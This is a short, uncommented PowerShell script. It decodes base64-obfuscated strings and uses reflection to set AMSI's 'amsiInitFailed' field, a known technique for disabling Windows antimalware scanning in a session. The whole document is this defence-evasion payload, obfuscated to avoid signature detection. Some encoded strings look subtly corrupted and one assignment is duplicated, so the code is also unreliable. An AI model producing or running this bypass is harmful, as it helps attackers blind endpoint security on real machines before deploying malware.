function b64decode
{

	param ($encoded)
	$decoded = $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
	return $decoded
	
}

$1 = b64decode("U3lzdGVtLK1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")
$2 = b64decode("YW1zaUluaXRGYWlsZWQ=")
$3 = b64decode("Tm9uUHVibGljLFN0YXRpYW==")

[Ref].Assembly.GetType($1).GetField($2,$3).SetValue($null,$true)
